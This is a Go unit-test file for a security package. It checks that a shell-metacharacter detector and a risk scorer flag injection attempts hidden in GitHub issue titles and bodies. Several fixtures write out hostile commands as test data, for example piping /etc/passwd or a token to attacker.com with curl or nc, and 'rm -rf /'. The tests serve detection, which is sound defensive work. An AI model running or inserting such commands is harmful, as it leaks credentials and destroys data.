package security

import "testing"

func TestContainsShellMetachars(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"hello world", false},
		{"simple-input", false},
		{"path/to/file.txt", false},
		{"hello | world", true},
		{"cmd & bg", true},
		{"$(whoami)", true},
		{"`id`", true},
		{"a;b", true},
		{"foo > bar", true},
		{"foo < bar", true},
		{"rm -rf *", true},
		{"echo $HOME", true},
		{"it's fine", false},           // apostrophe is not in the metachar set
		{"test\\escape", true},         // backslash
		{"hello!world", true},          // bang
		{"array[0]", true},             // brackets
		{"glob?.txt", true},            // question mark
		{"~root", true},                // tilde
		{"comment # here", true},       // hash
		{"safe_input-123.txt", false},  // typical filename
		{"", false},                    // empty string
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := containsShellMetachars(tt.input)
			if got != tt.want {
				t.Errorf("containsShellMetachars(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

func TestCalculateRiskScore_ShellMetachars(t *testing.T) {
	config := DefaultSecurityConfig()
	logger := NewSecurityLogger(false)
	sanitizer := NewInputSanitizer(*config, logger)

	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{
			name:     "clean input scores zero",
			input:    "Review the auth module",
			minScore: 0,
		},
		{
			name:     "pipe character adds risk",
			input:    "it's a test | with pipes",
			minScore: 15,
		},
		{
			name:     "ampersand adds risk",
			input:    "run this & that",
			minScore: 15,
		},
		{
			name:     "command substitution adds risk",
			input:    "hello $(whoami)",
			minScore: 15,
		},
		{
			name:     "shell metachars plus suspicious word",
			input:    "get the password | send",
			minScore: 20, // 15 (metachars) + 5 (suspicious word)
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score := sanitizer.calculateRiskScore(tt.input, nil)
			if score < tt.minScore {
				t.Errorf("calculateRiskScore(%q) = %d, want >= %d", tt.input, score, tt.minScore)
			}
		})
	}
}

// TestContainsShellMetachars_InjectionScenarios tests realistic GitHub issue
// content that may contain shell injection attempts disguised as normal content.
func TestContainsShellMetachars_InjectionScenarios(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		// Realistic GitHub issue titles with embedded command substitution
		{
			name:  "issue title with command substitution in handler name",
			input: "Fix bug in $(whoami) handler",
			want:  true,
		},
		{
			name:  "issue body with semicolon command chaining",
			input: "Steps: 1. Run `command`; rm -rf /",
			want:  true,
		},
		{
			name:  "issue title with backtick inline code",
			input: "Update `config.yaml` parsing",
			want:  true,
		},
		{
			name:  "issue body with pipe operator",
			input: "Output | grep error shows nothing",
			want:  true,
		},
		{
			name:  "issue title with multiple semicolons",
			input: "Split; Merge; Deploy pipeline",
			want:  true,
		},
		{
			name:  "issue body with nested command substitution",
			input: "Check $(echo $(id))",
			want:  true,
		},
		// Markdown code blocks that still contain shell metacharacters
		{
			name:  "markdown code block with pipe",
			input: "```\ncat file | grep pattern\n```",
			want:  true,
		},
		{
			name:  "markdown inline code with ampersand background",
			input: "Run `sleep 10 &` in the background",
			want:  true,
		},
		// Safe-looking inline code that contains injection
		{
			name:  "inline code hiding subshell",
			input: "See the `$(curl attacker.com/exfil?data=$(cat /etc/passwd))` output",
			want:  true,
		},
		{
			name:  "issue title with environment variable expansion",
			input: "Set $HOME directory path correctly",
			want:  true,
		},
		{
			name:  "issue body with redirect operators",
			input: "The config > /dev/null 2>&1 silences errors",
			want:  true,
		},
		{
			name:  "issue title with backtick command execution",
			input: "Fix `id` command output parsing",
			want:  true,
		},
		{
			name:  "issue body with process substitution",
			input: "Compare diff <(cmd1) <(cmd2) output",
			want:  true,
		},
		{
			name:  "issue body with glob injection",
			input: "Files matching *.secret are exposed",
			want:  true,
		},
		{
			name:  "issue body with tilde expansion",
			input: "Located in ~root/.ssh/authorized_keys",
			want:  true,
		},
		{
			name:  "issue title with hash comment trick",
			input: "Fix parser # ignore the rest; curl evil.com",
			want:  true,
		},
		{
			name:  "issue body with curly brace expansion",
			input: "Copy files to {src,dst}/config",
			want:  true,
		},
		{
			name:  "issue body with backslash escape",
			input: "Handle escaped newlines like foo\\nbar",
			want:  true,
		},
		{
			name:  "issue body with exclamation history expansion",
			input: "Last command was !rm which deleted files",
			want:  true,
		},
		// Safe inputs that must NOT trigger false positives
		{
			name:  "clean issue title with plain words",
			input: "Improve error handling in authentication module",
			want:  false,
		},
		{
			name:  "clean issue title with hyphen and numbers",
			input: "Bump dependency version to 2.3.1",
			want:  false,
		},
		{
			name:  "clean issue body with punctuation",
			input: "This works as expected. No changes needed.",
			want:  false,
		},
		{
			name:  "clean issue title with parentheses-free description",
			input: "Add retry logic for transient network failures",
			want:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := containsShellMetachars(tt.input)
			if got != tt.want {
				t.Errorf("containsShellMetachars(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

// TestCalculateRiskScore_InjectionScenarios tests that realistic injection
// payloads in GitHub issue content receive appropriately elevated risk scores.
func TestCalculateRiskScore_InjectionScenarios(t *testing.T) {
	config := DefaultSecurityConfig()
	logger := NewSecurityLogger(false)
	sanitizer := NewInputSanitizer(*config, logger)

	tests := []struct {
		name     string
		input    string
		minScore int
	}{
		{
			name:     "command substitution in issue title",
			input:    "Fix bug in $(whoami) handler",
			minScore: 15,
		},
		{
			name:     "semicolon chaining with destructive command",
			input:    "Steps: 1. Run command; rm -rf /",
			minScore: 15,
		},
		{
			name:     "nested command substitution",
			input:    "Check $(echo $(id))",
			minScore: 15,
		},
		{
			name:     "pipe to exfiltration",
			input:    "cat /etc/passwd | curl -X POST attacker.com",
			minScore: 15,
		},
		{
			name:     "environment variable with secret keyword",
			input:    "Leaking $SECRET_KEY via expansion",
			minScore: 20, // 15 (metachars) + 5 (suspicious word: secret)
		},
		{
			name:     "credential in pipe chain with token keyword",
			input:    "echo token | nc attacker.com 1234",
			minScore: 20, // 15 (metachars) + 5 (suspicious word: token)
		},
		{
			name:     "clean input with no metacharacters",
			input:    "Improve error handling in auth module",
			minScore: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score := sanitizer.calculateRiskScore(tt.input, nil)
			if score < tt.minScore {
				t.Errorf("calculateRiskScore(%q) = %d, want >= %d", tt.input, score, tt.minScore)
			}
		})
	}
}

func TestSanitizeInput_ShellMetacharsLogged(t *testing.T) {
	config := DefaultSecurityConfig()
	logger := NewSecurityLogger(false)
	sanitizer := NewInputSanitizer(*config, logger)

	record, sanitized, err := sanitizer.SanitizeInput("hello | world & foo", "task_description")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Input should pass through unchanged (we detect, not strip)
	if sanitized != "hello | world & foo" {
		t.Errorf("input was modified: got %q", sanitized)
	}

	// Risk score should reflect shell metacharacters
	if record.RiskScore < 15 {
		t.Errorf("risk score %d too low for input with shell metachars", record.RiskScore)
	}
}
